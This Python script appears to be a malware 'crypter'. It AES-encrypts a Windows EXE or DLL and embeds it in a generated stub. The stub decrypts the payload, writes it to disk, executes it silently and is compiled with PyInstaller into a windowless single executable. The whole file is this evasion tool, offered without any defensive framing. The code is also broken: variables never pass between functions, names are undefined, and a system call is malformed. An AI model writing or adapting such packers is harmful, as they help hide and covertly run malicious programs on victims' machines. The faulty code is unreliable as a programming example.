import pyaes
import sys
import binascii

args = sys.argv

try:
    file_name_arg = args[1]
    bytes_16_key = args[2]
except:
    print('File name & 16 bytes key are required.')
    exit(0)

def open_file():
    if file_name_arg.lower().endswith(('.exe', '.dll')):
        try:
            file_name = file_name_arg
            file = open(file_name, 'rb')
            file_data = file.read()
            file.close()
        except:
            print('Error while opening the file.')
            exit(0)
    else:
        print('Only PE file are acceptable (EXE) AND (DLL)')
        exit(0)

def crypt_file():
    global file_data
    try:
        aes_key = bytes_16_key
        if aes_key == '-r' or aes_key == '--random-key':
            from random import choice
            aes_key = ''.join(choice('0123456789ABCDEF') for i in range(16))
            print('Random Generated Key:', aes_key)
        else:
            if len(aes_key) != 16:
                print('AES Key needs to be 16 bytes longer (16 char)')
                exit(0)

        aes = pyaes.AESModeOfOperationCTR(aes_key)
        crypt_data = aes.encrypt(file_data)
        crypt_data_hex = binascii.hexlify(crypt_data)
    except:
        print('Error while crypting the file')
        exit(0)

def create_stub():
    global aes_key
    global new_crypt_data_hex
    global new_file_name

    try:
        stub = "import pyaes\n"
        stub += "crypt_data_hex = \"" + crypt_data_hex + "\"\n"
        stub += "key = \"" + aes_key + "\"\n"
        stub += "new_file_name = \"" + new_file_name + "\"\n"
        stub += """
        aes = pyaes.AESModeOfOperationCTR(key)
        crypt_data = crypt_data_hex.decode('hex')
        decrypt_data = aes.decrypt(crypt_data)

        new_file = open(new_file_name, 'wb')
        new_file.write(decrypt_data)
        new_file.close()

        import subprocess
        proc = subprocess.Popen(new_file_name, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        """
    except:
        print('Error while creating the file stub')
        exit(0)

def save_stub():
    global stub
    try:
        stub_name = 'stub.py'
        stub_file = open(stub_name, 'w')
        stub_file.write(stub)
        stub_file.close()
    except:
        print('Error while saving the file stub')
        exit(0)
    
def py_to_exe():
    global stub_name
    import os
    try:
        os.system('pyinstaller -F -w --clean', stub_name)
    except:
        print('Error while converting .py to .exe')
        exit(0)

def main():
    open_file()
    crypt_file()
    create_stub()
    save_stub()
    py_to_exe()
    
if __name__ == '__main__':
    main()
